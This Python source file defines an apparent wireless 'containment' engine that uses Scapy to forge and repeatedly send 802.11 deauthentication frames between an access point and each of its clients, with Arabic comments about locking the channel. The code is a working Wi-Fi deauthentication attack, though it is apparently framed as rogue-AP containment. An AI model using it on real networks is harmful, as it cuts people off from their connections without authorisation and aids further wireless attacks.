import os
import time
import config
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from config import DEAUTH_COUNT, DEAUTH_INTERVAL

class ContainmentEngine:

    def __init__(self, iface):
        self.iface = iface

    def contain(self, bssid, clients, channel):

        print(f"[Containment] Locking on channel {channel}")

        # 🔒 قفل القناة
        config.LOCKED_CHANNEL = channel
        time.sleep(1)

        for client in clients:
            self.deauth_pair(bssid, client)

        # 🔓 فك القفل بعد الانتهاء
        config.LOCKED_CHANNEL = None


    def deauth_pair(self, bssid, client):

    # AP → Client
      pkt1 = RadioTap() / \
        Dot11(addr1=client,
              addr2=bssid,
              addr3=bssid) / \
        Dot11Deauth(reason=7)

    # Client → AP
      pkt2 = RadioTap() / \
        Dot11(addr1=bssid,
              addr2=client,
              addr3=bssid) / \
        Dot11Deauth(reason=7)

      sendp(pkt1,
          iface=self.iface,
          count=DEAUTH_COUNT,
          inter=DEAUTH_INTERVAL,
          verbose=False)

      sendp(pkt2,
          iface=self.iface,
          count=DEAUTH_COUNT,
          inter=DEAUTH_INTERVAL,
          verbose=False)